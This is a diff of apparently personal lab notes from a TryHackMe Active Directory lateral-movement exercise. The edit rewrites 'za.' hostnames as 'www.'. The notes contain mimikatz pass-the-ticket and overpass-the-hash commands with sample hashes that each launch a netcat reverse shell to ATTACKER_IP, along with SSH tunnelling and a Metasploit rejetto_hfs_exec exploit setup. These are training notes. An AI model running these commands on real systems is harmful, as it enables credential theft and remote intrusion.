@@ -284,7 +284,7 @@ While mimikatz can extract any TGT or TGS available from the memory of the LSASS
 
 Once we have extracted the desired ticket, we can inject the tickets into the current session with the following
 ```mimikatz
-kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.DOMAIN.COM.kirbi
+kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-www.DOMAIN.COM.kirbi
 ```
 Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, we can use the `klist` command on cmd or `kerberos::list` inside mimikatz.
 
@@ -294,18 +294,18 @@ When a user requests a TGT, they send a timestamp encrypted with an encryption k
 Depending on the available [[Mimikatz#Extracting Kerberos Encryption keys from LSASS memory|Kerberos encryption keys]], we can run the following commands on mimikatz to get a reverse shell via PtK
 ### If we have the RC4 hash
 ```mimikatz
-sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
+sekurlsa::pth /user:Administrator /domain:www.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
 ```
 Note that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is known as **Overpass-the-Hash** (OPtH)
 
 ### If we have the AES128 hash
 ```mimikatz
-sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
+sekurlsa::pth /user:Administrator /domain:www.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
 ```
 
 ### If we have the AES256 hash
 ```mimikatz
-sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
+sekurlsa::pth /user:Administrator /domain:www.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
 ```
 
 
@@ -432,7 +432,7 @@ socks4 127.0.0.1 9050
 The default port is 9050, but any port will work as long as it matches the one used when establishing the SSH tunnel.
 If we now want to execute any command through the proxy, we can use proxychains:
 ```sh
-proxychains curl http://pxeboot.za.domain.com
+proxychains curl http://pxeboot.www.domain.com
 ```
 Note that some software like nmap might not work well with SOCKS in some circumstances, and might show altered results, so the efficiency of this method may vary.
 
@@ -445,7 +445,7 @@ With this in mind, we have 3 ports that we need to forward, we could use SSH to 
 ![[Pasted image 20241104112518.png]]
 Assuming that the vulnerable port is `80`, the port for the server is `4444` and the reverse port is `1337`, we can use the following command
 ```cmd
-ssh tunneluser@Attacker_PC -R 80:dc.za.domain.com:80 -L *:4444:127.0.0.1:4444 -L *:1337:127.0.0.1:1337 -N
+ssh tunneluser@Attacker_PC -R 80:dc.www.domain.com:80 -L *:4444:127.0.0.1:4444 -L *:1337:127.0.0.1:1337 -N
 ```
 
 Once all port forwards are in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:
@@ -454,7 +454,7 @@ user@AttackBox$ msfconsole
 msf6 > use rejetto_hfs_exec
 msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
 
-msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.www.tryhackme.com
 msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
 msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 1337 
 msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
